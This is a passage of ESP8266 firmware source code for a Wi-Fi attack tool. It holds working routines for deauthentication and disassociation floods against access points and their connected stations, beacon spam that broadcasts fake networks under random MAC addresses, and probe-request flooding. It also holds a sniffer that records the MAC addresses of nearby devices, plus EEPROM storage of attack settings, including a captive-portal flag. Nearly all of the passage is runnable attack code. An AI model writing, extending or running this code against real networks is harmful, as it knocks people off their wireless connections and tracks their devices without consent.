            // Target specific stations if available
            int stationLimit = minVal(2, (int)stations.size());
            for (int s = 0; s < stationLimit; s++) {
              if (stations[s].ap_mac == bssid) {
                // Parse station MAC with bounds checking
                uint8_t staMac[6];
                bool validStaMAC = true;
                for (int j = 0; j < 6 && validStaMAC; j++) {
                  if (stations[s].mac.length() >= (j * 3 + 2)) {
                    String hex = stations[s].mac.substring(j * 3, j * 3 + 2);
                    staMac[j] = strtol(hex.c_str(), NULL, 16);
                  } else {
                    validStaMAC = false;
                  }
                }

                if (validStaMAC) {
                  // Targeted deauth
                  for (int j = 0; j < 6; j++) {
                    deauthPacket[4 + j] = staMac[j];  // Station target
                    deauthPacket[10 + j] = mac[j];    // AP source
                  }

                  if (sendPacketSafely(deauthPacket, sizeof(deauthPacket))) {
                    stats.deauthPackets++;
                    totalPackets++;
                  }
                  delayMicroseconds(300);
                }
              }
            }
          } else {
            // Enhanced disassociation attack
            for (int i = 0; i < 6; i++) {
              disassocPacket[4 + i] = 0xFF;     // Broadcast target
              disassocPacket[10 + i] = mac[i];  // AP source
              disassocPacket[16 + i] = mac[i];  // BSSID
            }

            // Send disassociation packets
            uint8_t disassocReasons[] = {1, 2, 3, 5};
            for (int i = 0; i < 1; i++) { // Reduced to 1
              disassocPacket[24] = disassocReasons[i % 4];
              if (sendPacketSafely(disassocPacket, sizeof(disassocPacket))) {
                stats.deauthPackets++;
                totalPackets++;
              }
              delayMicroseconds(400);
            }
          }

          packetType = (packetType + 1) % 2;
        }
        break;
      }

      currentAP++;
      attempts++;
    }

    currentAP++;
  }
}

void performBeaconSpam() {
  static unsigned long lastBeacon = 0;
  static int currentSSID = 0;

  if (millis() - lastBeacon > 150) { // Increased interval to reduce memory pressure
    lastBeacon = millis();

    // Find next enabled SSID with bounds checking
    int attempts = 0;
    int maxAttempts = minVal(5, (int)ssidList.size());
    
    while (attempts < maxAttempts) {
      if (currentSSID >= (int)ssidList.size()) {
        currentSSID = 0;
      }

      if (currentSSID < (int)ssidList.size() && ssidList[currentSSID].enabled) {
        String ssid = ssidList[currentSSID].ssid;

        // Create beacon packet
        uint8_t packet[80]; // Fixed packet size
        memcpy(packet, beaconPacket, sizeof(beaconPacket));

        // Realistic MAC address generation
        packet[10] = 0x02; // Locally administered bit
        for (int i = 11; i < 16; i++) {
          packet[i] = random(0x00, 0xFF);
        }

        // Copy source to BSSID
        memcpy(&packet[16], &packet[10], 6);

        // Simple timestamp
        uint32_t timestamp = millis();
        memcpy(&packet[24], &timestamp, 4);

        // Beacon interval
        packet[32] = 0x64; // 100 TU
        packet[33] = 0x00;

        // Capability info
        packet[34] = 0x01; // ESS capability
        packet[35] = ssidList[currentSSID].wpa2 ? 0x10 : 0x00;

        // SSID element with bounds checking
        int ssidLen = minVal(15, (int)ssid.length()); // Reduced max SSID length
        packet[37] = ssidLen;
        for (int i = 0; i < ssidLen; i++) {
          packet[38 + i] = ssid[i];
        }

        int pos = 38 + ssidLen;

        // Basic supported rates
        if (pos + 10 < 80) {
          packet[pos++] = 0x01; // Element ID
          packet[pos++] = 0x04; // Length
          packet[pos++] = 0x82; // 1 Mbps
          packet[pos++] = 0x84; // 2 Mbps
          packet[pos++] = 0x8B; // 5.5 Mbps
          packet[pos++] = 0x96; // 11 Mbps

          // DS Parameter Set
          packet[pos++] = 0x03; // Element ID
          packet[pos++] = 0x01; // Length
          packet[pos++] = random(1, 12); // Random channel (1-11)
        }

        // Send the beacon
        if (pos <= 80 && sendPacketSafely(packet, pos)) {
          stats.beaconPackets++;
        }
        
        delayMicroseconds(500);
        break;
      }

      currentSSID++;
      attempts++;
    }

    currentSSID++;
  }
}

void performProbeAttack() {
  static unsigned long lastProbe = 0;
  static int currentSSID = 0;

  if (millis() - lastProbe > 400) { // Increased interval
    lastProbe = millis();

    // Find next enabled SSID with bounds checking
    int attempts = 0;
    int maxAttempts = minVal(5, (int)ssidList.size());
    
    while (attempts < maxAttempts) {
      if (currentSSID >= (int)ssidList.size()) {
        currentSSID = 0;
      }

      if (currentSSID < (int)ssidList.size() && ssidList[currentSSID].enabled) {
        String ssid = ssidList[currentSSID].ssid;

        // Prepare probe packet
        uint8_t packet[60]; // Reduced size
        memcpy(packet, probePacket, minVal((size_t)60, sizeof(probePacket)));

        // Random MAC address
        for (int i = 10; i < 16; i++) {
          packet[i] = random(0, 255);
        }

        // Set SSID in probe packet with proper bounds
        int ssidLen = minVal(15, (int)ssid.length()); // Reduced max length
        if (25 < 60) {
          packet[25] = ssidLen;
          for (int i = 0; i < ssidLen && (26 + i) < 60; i++) {
            packet[26 + i] = ssid[i];
          }

          // Calculate packet size safely
          int packetSize = 26 + ssidLen + 8; // Reduced overhead
          if (packetSize > 60) packetSize = 60;

          // Send probe packet
          if (sendPacketSafely(packet, packetSize)) {
            stats.probePackets++;
          }
        }

        break;
      }

      currentSSID++;
      attempts++;
    }

    currentSSID++;
  }
}

void packetSniffer(uint8_t *buf, uint16_t len) {
  if (!packetMonitor || !buf || len < 24) return;

  stats.capturedPackets++;

  // Advanced packet analysis
  uint8_t frameType = buf[0] & 0xFC;

  // Track unique devices with MAC analysis
  static uint8_t seenMACs[20][6]; // Further reduced size
  static int macCount = 0;
  static unsigned long lastCleanup = 0;

  // Cleanup old entries every 2 minutes
  if (millis() - lastCleanup > 120000) {
    macCount = 0;
    lastCleanup = millis();
  }

  // Extract source MAC based on frame type
  uint8_t* srcMAC = nullptr;
  uint8_t* dstMAC = nullptr;

  if (len >= 24) {
    // Management and control frames
    if ((frameType & 0x0C) == 0x00 || (frameType & 0x0C) == 0x04) {
      dstMAC = &buf[4];
      srcMAC = &buf[10];
    }
    // Data frames
    else if ((frameType & 0x0C) == 0x08) {
      dstMAC = &buf[4];
      srcMAC = &buf[16];
    }

    // Track source MAC
    if (srcMAC && macCount < 20) {
      bool isNew = true;
      for (int i = 0; i < macCount; i++) {
        if (memcmp(seenMACs[i], srcMAC, 6) == 0) {
          isNew = false;
          break;
        }
      }

      if (isNew) {
        memcpy(seenMACs[macCount], srcMAC, 6);
        macCount++;
        stats.uniqueDevices = macCount;
      }
    }

    // Track destination MAC if different and not broadcast
    if (dstMAC && macCount < 20 && 
        !(dstMAC[0] == 0xFF && dstMAC[1] == 0xFF && dstMAC[2] == 0xFF && 
          dstMAC[3] == 0xFF && dstMAC[4] == 0xFF && dstMAC[5] == 0xFF)) {
      bool isNew = true;
      for (int i = 0; i < macCount; i++) {
        if (memcmp(seenMACs[i], dstMAC, 6) == 0) {
          isNew = false;
          break;
        }
      }

      if (isNew) {
        memcpy(seenMACs[macCount], dstMAC, 6);
        macCount++;
        stats.uniqueDevices = macCount;
      }
    }
  }
}

void updateLED() {
  static unsigned long lastLED = 0;
  static bool ledState = false;

  unsigned long interval = 1000; // Default slow blink

  if (attacking || beaconSpam || probeAttack) {
    interval = 100; // Fast blink when active
  } else if (scanning || packetMonitor) {
    interval = 250; // Medium blink when scanning/monitoring
  }

  if (millis() - lastLED > interval) {
    lastLED = millis();
    ledState = !ledState;
    digitalWrite(LED_PIN, ledState ? LOW : HIGH); // Inverted for ESP8266
  }
}

void saveSettings() {
  // Save settings to EEPROM with bounds checking
  if (packetsPerSecond >= 1 && packetsPerSecond <= 50) {
    EEPROM.write(0, packetsPerSecond);
  }
  EEPROM.write(1, captivePortal ? 1 : 0);
  
  int ssidCount = minVal(MAX_SSIDS, (int)ssidList.size());
  EEPROM.write(2, ssidCount);

  int addr = 3;
  for (int i = 0; i < ssidCount && addr < 500; i++) {
    int ssidLen = minVal(20, (int)ssidList[i].ssid.length());
    EEPROM.write(addr++, ssidLen);
    for (int j = 0; j < ssidLen && addr < 500; j++) {
      EEPROM.write(addr++, ssidList[i].ssid[j]);
    }
    if (addr < 500) EEPROM.write(addr++, ssidList[i].enabled ? 1 : 0);
    if (addr < 500) EEPROM.write(addr++, ssidList[i].wpa2 ? 1 : 0);
  }

  EEPROM.commit();
}

void loadSettings() {
  // Load settings from EEPROM with validation
  int pps = EEPROM.read(0);
  if (pps >= 1 && pps <= 50) {
    packetsPerSecond = pps;
  } else {
    packetsPerSecond = 20;
  }

  captivePortal = EEPROM.read(1) == 1;

  int ssidCount = EEPROM.read(2);
  if (ssidCount > MAX_SSIDS || ssidCount < 0) ssidCount = 0;

  int addr = 3;
  ssidList.clear();

  for (int i = 0; i < ssidCount && addr < 500; i++) {
    SSIDData ssid;
    int len = EEPROM.read(addr++);
    if (len > 20 || len < 0 || addr >= 500) break; // Invalid data

    ssid.ssid = "";
    for (int j = 0; j < len && addr < 500; j++) {
      ssid.ssid += (char)EEPROM.read(addr++);
    }
    if (addr < 500) ssid.enabled = EEPROM.read(addr++) == 1;
    if (addr < 500) ssid.wpa2 = EEPROM.read(addr++) == 1;

    if (ssid.ssid.length() > 0) {
      ssidList.push_back(ssid);
    }
  }
}
